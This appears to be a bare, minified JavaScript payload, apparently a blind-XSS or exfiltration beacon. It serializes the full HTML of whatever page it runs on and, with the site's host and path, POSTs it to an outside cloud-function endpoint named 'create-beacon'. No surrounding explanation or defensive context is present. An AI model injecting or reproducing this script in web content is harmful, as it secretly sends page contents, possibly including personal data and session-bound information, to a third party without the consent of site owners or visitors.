var source=location.host+location.pathname,content=(new XMLSerializer).serializeToString(document),data=JSON.stringify({source:source,content:content}),xhr=new XMLHttpRequest;xhr.withCredentials=!0,xhr.addEventListener("readystatechange",function(){4 === this.readyState && console.log(this.responseText)}),xhr.open("POST","https://asia-east2-linear-trees-273018.cloudfunctions.net/create-beacon"),xhr.setRequestHeader("Content-Type","application/json"),xhr.withCredentials=!1,xhr.send(data);
